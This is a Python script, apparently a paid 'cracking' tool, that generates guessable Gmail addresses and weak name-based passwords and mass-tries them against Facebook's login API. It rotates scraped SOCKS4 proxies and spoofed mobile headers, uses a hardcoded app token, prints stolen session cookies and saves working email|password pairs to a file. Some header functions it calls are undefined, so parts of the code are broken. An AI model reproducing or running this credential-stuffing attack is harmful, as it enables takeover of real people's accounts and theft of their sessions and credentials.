import os, random,time,re,uuid,sys,json
try:
    import rich, requests
except:
    os.system("pip install requests rich httpx")
    import rich, requests, httpx

from rich import print 
from rich.panel import Panel 
from rich.tree import Tree
from concurrent.futures import ThreadPoolExecutor as ThreadPool




import requests





emad=[]
os.system("xdg-open https://m.facebook.com/groups/1311653583047186/?ref=share&mibextid=7dSybO")
def mail(emad, limit):
    while True:
        Mail=['Salam','Fahim','Tarek','Khorshed','Salman','Siraj','Sajjad','Jubayer','Tasin','Emran','Emon','Himal','Sabbir','Sojib','Ridoy','Abir','Mahadi','Asif','Sani','Kousik','Arnob','Sami','Ariyan','Tushar','Naim']
        female=["Zara","Sadiya","Jannat","Sumaiya","Bristi","Misti","Sumi","Riya","Sanjida","Mahi","Oprinta","Oprintita","Tisha","Taniya","Tonni","Eva","Mim","Shima","Priya","Tanima","Mariya","Pinki"]
        subDomain1m=["gamer","ff","fflover","yt","official","boss","gaming","Gaming","Gamer","FF","FFlover","freefirelover","YT","999","king","streamer","ffking","Khan","Ahamed","Chowdhury","Roy","Talukdahar","Haque","Shaikh","Vai","Hossain","Hasan","Islam","xxx"]
        
        subDomain2m=["pro","noob","hacker","Itz","Pro","Noob"]
        subDomain3m=["Abir","Jisan","Rabbi","Surjo","Niloy","Joy","Sabbir","Siam","Rahul","Bisal","Naim","Saim","Orko"]
        subDomain4m=["Khan","Ahamed","Chowdhury","Roy","Talukdahar","Haque","Shaikh","Vai","Hossain","Hasan","Islam"]
        subDomain1f=["Queen","queen","gaming","streamer","FF","ff","yt","YT","ffgirl","ffqueen","freefirelover","ffyt","gamer","islam","Jahan","Moni","Chowdhury","Khan","Roy","Ahamed"]
        subDomain2f=["Pro","pro","noobre"]
        subDomain3f=["Mahi","Samiya","Sadiya","Sumi","Sultana","Nusrat","Fariya","Mim","Tanisa","Sumaiya","Sathi","Rimi","Pori","Priya"]
        subDomain4f=["Islam","Jahan","Moni","Chowdhury","Khan","Roy","Ahamed"]
        
        ma=random.choice(Mail)
        ma1=random.choice(subDomain1m)
        ma0=random.choice(subDomain2m)
        em=ma+ma1+str(random.choice(range(999)))+"@gmail.com"
        if em in emad:
            pass
        else:
            emad.append(em+"|"+ma+" "+ma1)
        
        ma=random.choice(Mail)
        ma1=random.choice(subDomain1m)
        ma0=random.choice(subDomain2m)
        emx=ma+ma1+str(random.choice(range(9999)))+"@gmail.com"
        if emx in emad:
            pass
        else:
             emad.append(emx+"|"+ma+" "+ma1)
        
        ma=random.choice(Mail)
        ma1=random.choice(subDomain1m)
        ma0=random.choice(subDomain2m)
        em1=ma0+ma+ma1+str(random.choice(range(999)))+"@gmail.com"
        if em1 in emad:
            pass
        else:
            emad.append(em1+"|"+ma+" "+ma1)
        fa1=random.choice(female)
        fa2=random.choice(subDomain1f)
        fae=fa1+fa2+str(random.choice(range(999)))+"@gmail.com"
        if fae in emad:
            pass
        else:
            emad.append(fae+"|"+fa1+" "+fa2)
        fa1=random.choice(female)
        fa2=random.choice(subDomain1f)
        fa3=random.choice(subDomain2f)
        fae2=fa3+fa1+fa2+str(random.choice(range(999)))+"@gmail.com"
        if fae2 in emad:
            pass
        else:
            emad.append(fae2+"|"+fa1+" "+fa2)
        
        max=random.choice(Mail)
        max1=random.choice(subDomain4m)
        
        Mmail=f"{max}{max1}{random.choice(range(1000))}@gmail.com"
        if Mmail in emad:
            pass
        else:
            emad.append(Mmail+"|"+max+" "+max1)
        
        
        
        Sex=random.choice(female)
        Sex2=random.choice(subDomain4f)
        
        Fmail=f"{Sex}{Sex2}{random.choice(range(1000))}@gmail.com"
        if Fmail in emad:
            pass
        else:
            emad.append(Fmail+"|"+Sex+" "+Sex2)

        if len(emad) > limit:
            break
        else:
            continue
    
try:
    prox = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
    open('.prox.txt', 'w').write(prox)
except:
    print('Internet Error')
    sys.exit()

xvx = open('.prox.txt', 'r').read().splitlines()

oks=[]
done=0

def windows():
    aV=str(random.choice(range(10,20)))
    A=f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5,7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8,12)))}.0.{str(random.choice(range(552,661)))}.0 Safari/534.{aV}"
    bV=str(random.choice(range(1,36)))
    bx=str(random.choice(range(34,38)))
    bz=f"5{bx}.{bV}"
    B=f"Mozilla/5.0 (Windows NT {str(random.choice(range(5,7)))}.{str(random.choice(['2','1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12,42)))}.0.{str(random.choice(range(742,2200)))}.{str(random.choice(range(1,120)))} Safari/{bz}"
    cV=str(random.choice(range(1,36)))
    cx=str(random.choice(range(34,38)))
    cz=f"5{cx}.{cV}"
    C=f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2','1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12,42)))}.0.{str(random.choice(range(742,2200)))}.{str(random.choice(range(1,120)))} Safari/{cz}"
    D=f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1,7120)))}.0 Safari/537.36"
    return random.choice([A,B,C,D])

	
logo=""" [red]
     ______ _      _____ _______ ______  
 |  ____| |    |_   _|__   __|  ____| 
 | |__  | |      | |    | |  | |__    
 |  __| | |      | |    | |  |  __|   
 | |____| |____ _| |_   | |  | |____  
 |______|______|_____|  |_|  |______|         
                                     v/4"""
"OWNER: LABIB ISLAM"
"TOOL: GAME CLONE"
"GITHUB: labibislam50"
"STATUS: PAID"  

meth=Tree("[reverse white][red]Mathod[/red][/reverse white]\n")
meth.add("[bold green1]A").add("[green1]B-Graph(Data)")
meth.add("[bold bright_magenta]B").add("[bright_magenta]Graph(Wifi)")
meth.add("Example [blue]([bold green1]A[blue]/[bold bright_magenta]B[blue])")

def main():
    os.system('clear')
    print(logo)
    print("")
    print(meth)
    print("[bold violet]—"*35)
    SHEIKH=input("choose> ")
    if SHEIKH in ["01","1","A","a"]:
        md="1"
    else:
        md="2"
    
    os.system('clear')
    print(logo)
    print('')
    print("[reverse white]Cracking Speed[/reverse white]\n")
    print("Example [30-120] 50, 70, 90, 100")
    print("[bold violet]—"*35)
    try:
        speed=int(input("choice Speed> "))
        if speed < 130:
            pass
        else:speed=120
    except:
        main()
    
    
    
    os.system('clear')
    print(logo)
    
    mail(emad, 10000)
    
    print(f" Crack Limit 10000 > Method {md} ")
    print("[bold violet]—"*35)
    with ThreadPool(max_workers=speed) as pool:
        for ex in emad:
            Gmail=ex.split("|")[0].lower()
            Name=ex.split("|")[1]
            psslist=[]
            First=Name.split(" ")[0]
            Last=Name.split(" ")[1]
            
            if len(First) >2:
                psslist.append(First.lower()+"123")
                psslist.append(First+"123")
            else:pass
            if len(First) >3:
                psslist.append(First+"12")
                psslist.append(First+"@@")
                psslist.append(First+"@#")
                psslist.append(First.lower()+"12")
                psslist.append(First.lower()+"@@")
                psslist.append(First.lower()+"@#")
            else:pass
            
            if len(First) >1:
                psslist.append(First+"@123")
                psslist.append(First+"1234")
                #psslist.append(First+"12345")
                #psslist.append(First+"@1234")
                psslist.append(First.lower()+"1234")
                psslist.append(First.lower()+"12345")
                psslist.append(First.lower()+"@123")
                psslist.append(First.lower()+"@1234")
            else:pass
            
            if len(First) >4:
                psslist.append(First.lower()+"@")
                #psslist.append(First+"@")
            else:pass
            psslist.append(First.lower()+Last.lower())
            psslist.append(First.lower()+" "+Last.lower())
            psslist.append(First.lower()+Last.lower()+"123")
            psslist.append(First.lower()+Last.lower()+"1234")
            psslist.append(Last.lower()+"123")
            psslist.append(Last.lower()+"1234")
            psslist.append(First+" "+Last)
            
            if md in ["1","01"]:
                pool.submit(file_subb,Gmail,psslist)
            else:
                pool.submit(normal,Gmail,psslist)






def live_ck(uid):
    SHEIKH=requests.get(f"https://thanhlike.com/modun/tool/get_facebook.php?type=checklive&id={uid}").text
    data=str(SHEIKH)
    if "live" == data.lower():
        return "Alive"
    else:
        return "death"


def file_subb(Gmail,psslist):
    global oks,done,xvx
    sys.stdout.write(f"\r  \033[38;5;46m[LABIB] {done}|{str(len(oks))}\r");sys.stdout.flush()
    session=requests.Session()
    try:
        for ps in psslist:
            prox=random.choice(xvx)
            bro={"http":"socks4://"+prox}
  #          user_agent="Dalvik/2.1.0 (Linux; Android 10; POCOPHONE F1) [FBAN/MobileAdsManagerAndroid;FBAV/324.0.0.28.115;FBBV/464692125;FBRV/0;FBPN/com.facebook.adsmanager;FBLC/en_US;FBMF/POCOPHONE;FBBF/Poco;FBDV/Poco F1;FBSV/10;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1424};FB_FW/1;]"
            data={
            'adid': str(uuid.uuid4()),
            'format': 'json',
            'device_id': str(uuid.uuid4()),
            'email': Gmail,
            'password': ps,
            'generate_analytics_claims': '1',
            'community_id': '',
            'cpl': 'true',
            'try_num': '1',
            'family_device_id': str(uuid.uuid4()),
            'credentials_type': 'password',
            'source': 'login',
            'error_detail_type': 'button_with_disabled',
            'enroll_misauth': 'false',
            'generate_session_cookies': '1',
            'generate_machine_id': '1',
            'currently_logged_in_userid': '0',
            'locale': 'en_GB',
            'client_country_code': 'GB',
            'fb_api_req_friendly_name': 'authenticate'}
            head={
          #  'User-Agent': Samsung(),
       #     'User-Agent': Redmi(),
            'User-Agent': zte(),
#            'User-Agent': oppo(),
#            'User-Agent': HUAWEI(),
 #           'User-Agent': lge(),
 #           'User-Agent': Hisense(),
#            'User-Agent': vivo(),
  #          'User-Agent': Amazon(),
    #        'User-Agent': google(),
    #        'User-Agent': motorola(),
    #        'User-Agent': lenovo(),
     #       'User-Agent': asus(),
       #     'User-Agent': poco(),
         #   'User-Agent': tecno(),
            'Accept-Encoding':  'gzip, deflate',
            'Accept': '*/*',
            'Connection': 'keep-alive',
            'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'X-FB-Friendly-Name': 'authenticate',
            'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),
            'X-FB-Net-HNI': str(random.randint(20000, 40000)),
            'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
            'X-FB-Connection-Type': 'unknown',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-FB-HTTP-Engine': 'Liger'}
            url1= 'https://b-graph.facebook.com/auth/login'
            q = requests.post(url1,data=data,headers=head,allow_redirects=False,proxies=bro).json()
            if "session_key" in q:
                cid=q["uid"]
                coki=";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                if "Alive" == live_ck(cid):
                    print(f"\r\r[reverse white][FreeFire][/reverse white] {cid} | {ps}   \n[🎮][green1]{coki} \n")
                    open("/sdcard/FreeFire.txt","a").write(Gmail+"|"+ps+"\n")
                    oks.append(Gmail)
                    break
                else:pass
            elif "Please Confirm Email" in q:
                cid=q["uid"]
                coki=";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                if "Alive" == live_ck(cid):
                    print(f"\r\r[reverse white][FreeFire][/reverse white] {cid} | {ps}   \n[🎮][green1]{coki} \n")
                    open("/sdcard/FreeFire.txt.txt","a").write(Gmail+"|"+ps+"\n")
                    oks.append(Gmail)
                    break
                else:pass
            else:
                continue
        done+=1
    except:
        time.sleep(4)



def normal(Gmail,psslist):
    global oks,done,xvx
    sys.stdout.write(f"\r  \033[38;5;46m[LABIB] {done}|{str(len(oks))}\r");sys.stdout.flush()
    session=requests.Session()
    try:
        for ps in psslist:
            prox=random.choice(xvx)
            bro={"http":"socks4://"+prox}
            data={
            'adid': str(uuid.uuid4()),
            'format': 'json',
            'device_id': str(uuid.uuid4()),
            'email': Gmail,
            'password': ps,
            'generate_analytics_claims': '1', 
            'credentials_type': 'password',
            'source': 'login',
            'error_detail_type': 'button_with_disabled',
            'enroll_misauth': 'false', 
            'generate_session_cookies': '1', 
            'generate_machine_id': '1', 
            'meta_inf_fbmeta': '', 
            'currently_logged_in_userid': '0', 
            'fb_api_req_friendly_name': 'authenticate'}

            head={
            'User-Agent': SM-A720F(),
           # 'Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'Connection': 'close',
            'content-type': 'application/json; charset=UTF-8',
            'Host': 'graph.facebook.com',
            'X-FB-SIM-HNI': '30570',
            'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'X-FB-Connection-Type': 'WIFI',
            'X-Tigon-Is-Retry': 'False',
            'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
            'x-fb-device-group': '5120',
            'X-FB-Friendly-Name': 'ViewerReactionsMutation',
            'X-FB-Request-Analytics-Tags': 'graphservice',
            'X-FB-HTTP-Engine': 'Liger',
            'X-FB-Client-IP': 'True',
            'X-FB-Server-Cluster': 'True',
            'x-fb-connection-token': '8114af471d039628db5c68cb127af936'}
            url1= 'https://graph.facebook.com/auth/login'
            q = requests.post(url1,data=data,headers=head,allow_redirects=False,proxies=bro).json()
            if "session_key" in q:
                cid=q["uid"]
                coki=";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                if "Alive" == live_ck(cid):
                    print(f"\r\r[reverse white][FreeFire][/reverse white] {cid} | {ps}   \n[🎮][green1]{coki} \n")
                    open("/sdcard/FreeFire.txt","a").write(Gmail+"|"+ps+"\n")
                    oks.append(Gmail)
                    break
                else:pass
            elif "Please Confirm Email" in q:
                cid=q["uid"]
                coki=";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                if "Alive" == live_ck(cid):
                    print(f"\r\r[reverse white][FreeFire][/reverse white] {cid} | {ps}   \n[🎮][green1]{coki} \n")
                    open("/sdcard/FreeFire.txt.txt","a").write(Gmail+"|"+ps+"\n")
                    oks.append(Gmail)
                else:pass
            else:continue
        done+=1
    except:
        time.sleep(10)


if __name__=="__main__":
    main()